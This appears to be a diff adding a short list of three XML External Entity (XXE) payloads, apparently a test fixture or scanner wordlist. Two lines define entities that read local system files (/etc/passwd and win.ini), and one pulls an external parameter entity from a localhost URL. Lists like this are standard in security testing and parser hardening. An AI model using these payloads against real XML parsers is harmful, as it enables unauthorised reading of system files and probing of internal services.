@@ -1,0 +1,3 @@
+<?xml version="1.0"?><!DOCTYPE t [<!ENTITY x SYSTEM "file:///etc/passwd">]><t>&x;</t>
+<?xml version="1.0"?><!DOCTYPE t [<!ENTITY x SYSTEM "file:///c:/windows/win.ini">]><t>&x;</t>
+<?xml version="1.0"?><!DOCTYPE t [<!ENTITY % r SYSTEM "http://127.0.0.1/x">%r;]><t/>
